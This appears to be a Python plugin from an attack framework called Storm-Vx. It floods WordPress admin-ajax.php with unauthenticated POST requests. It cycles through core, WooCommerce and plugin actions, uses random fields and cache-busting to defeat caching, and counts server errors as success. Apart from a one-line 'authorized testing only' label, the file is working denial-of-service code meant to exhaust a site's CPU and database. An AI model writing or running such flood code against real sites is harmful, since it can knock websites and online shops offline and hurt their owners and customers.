#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_ajax_flood — WordPress admin-ajax.php Flood Attack Plugin

admin-ajax.php is the most heavily used WordPress endpoint:
- ALWAYS dynamic (bypasses ALL page caches — W3TC, WP Super Cache, etc.)
- Handles both authenticated and unauthenticated AJAX actions
- Unauthenticated (nopriv) actions require no login session
- Each request triggers full WordPress PHP bootstrap + action handler + DB query

Common nopriv actions that work WITHOUT authentication:
- wp_ajax_nopriv_heartbeat → WordPress Heartbeat API (CPU + DB)
- wp_ajax_nopriv_get_comments → Comments query (DB-heavy)
- wp_ajax_nopriv_custom → Theme/plugin custom actions
- wc_ajax_get_refreshed_fragments → WooCommerce cart fragments (CPU + DB)

Amplification: ~3x per request (PHP process + action handler + DB)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any, List
from urllib.parse import urlencode

import aiohttp

from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_cache_bust

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["WpAjaxFloodPlugin"]


# Common WordPress nopriv AJAX actions (work WITHOUT authentication)
_WP_NOPRIV_ACTIONS: List[str] = [
    # WordPress core
    "heartbeat",
    "get_comments",
    "replyto_comment",
    # WooCommerce (very common, CPU-heavy)
    "get_refreshed_fragments",
    "apply_coupon",
    "remove_coupon",
    "update_shipping_method",
    "update_order_review",
    "checkout",
    # Popular plugins
    "jetpack_likes",
    "ninja_forms_submit",
    "cf7_submit",
    "elementor_ajax",
    "wpforms_submit",
    "gf_submit",
    "ai_chat",
    # Theme actions
    "load_more",
    "infinite_scroll",
    "search_posts",
    "filter_posts",
    # Generic patterns
    "submit_form",
    "get_data",
    "update_cart",
    "process_payment",
]

# Authenticated AJAX actions (higher CPU but need session)
_WP_AUTH_ACTIONS: List[str] = [
    "wp_ajax_heartbeat",
    "wp_ajax_wp_compress_ajax",
    "wp_ajax_autosave",
    "wp_ajax_inline-save",
    "wp_ajax_widgets-order",
    "wp_ajax_menu-quick-search",
    "wp_ajax_update-plugin",
    "wp_ajax_install-plugin",
]


class WpAjaxFloodPlugin(AttackPlugin):
    """WordPress admin-ajax.php flood — dynamic endpoint with nopriv actions.

    admin-ajax.php is NEVER cached by any WordPress caching plugin
    because it handles dynamic AJAX requests. Each request triggers
    full PHP processing + DB queries, making it ideal for load testing.

    Uses nopriv (unauthenticated) AJAX actions for maximum reach —
    no session or login required.
    """

    meta = PluginMeta(
        name='wp_ajax_flood',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress admin-ajax.php flood — nopriv AJAX actions (3x amplification)',
        tags=['http', 'wordpress', 'ajax', 'cpu-burn', 'amplification'],
        priority=19,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """admin-ajax.php flood worker: POST nopriv AJAX actions."""
        _ssl = context.ssl_param
        site_root = context.site_root
        delay_ms = context.extra.delay_ms

        # admin-ajax.php endpoint
        ajax_url = f"{site_root}/wp-admin/admin-ajax.php"

        while not self._stop_event.is_set():
            try:
                # Select random nopriv action
                action = random.choice(_WP_NOPRIV_ACTIONS)

                # Build POST data
                data = {
                    "action": action,
                    # Add random data to make each request unique
                    f"_rand_{rand_str(3)}": rand_str(8),
                }

                # Some actions need specific data
                if action == "heartbeat":
                    data["data"] = f'{{"heartbeat":"{rand_str(6)}"}}'
                    data["interval"] = str(random.randint(15, 60))
                elif action in ("get_refreshed_fragments",):
                    data["product_id"] = str(random.randint(1, 9999))
                elif action in ("get_comments",):
                    data["post_id"] = str(random.randint(1, 99999))
                elif action in ("apply_coupon",):
                    data["coupon_code"] = rand_str(6).upper()
                elif action in ("search_posts", "filter_posts"):
                    data["query"] = rand_str(random.randint(3, 10))

                # Get fresh headers with AJAX-specific fingerprint
                headers = self._get_fresh_headers(context, "api")
                headers["Content-Type"] = "application/x-www-form-urlencoded"
                headers["X-Requested-With"] = "XMLHttpRequest"  # AJAX marker

                # Cache bust
                url = f"{ajax_url}?{rand_cache_bust()}"

                payload = urlencode(data)

                t = time.time()
                try:
                    async with context.session.post(
                        url, headers=headers, data=payload,
                        ssl=_ssl, allow_redirects=False,
                    ) as resp:
                        rt = time.time() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(
                            resp.status, resp_headers,
                            url=url[:60], worker_id=worker_id
                        )
                        # For AJAX: 200 (success), 400 (bad action=still processed by PHP),
                        # 403 (auth required for priv action), 500 (DB error=load!),
                        # 404 (action not found=PHP still bootstrapped)
                        # BUG-FIX v35: NOT_FOUND counts as ok for load testing
                        # because admin-ajax.php still triggers full PHP bootstrap
                        ok = response_class in (
                            ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                            ResponseClass.SERVER_ERROR, ResponseClass.NOT_FOUND
                        )
                        self._capture_response_cookies(resp, context)
                        await self._record(
                            "WP-AJAX", ok, resp.status, rt,
                            url=url[:60], hint=f"action={action}",
                        )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.time() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-AJAX", False, 0, rt,
                        err=type(exc).__name__, url=url[:60],
                        hint=f"action={action}",
                    )

                # Adaptive sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("WP-AJAX", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)
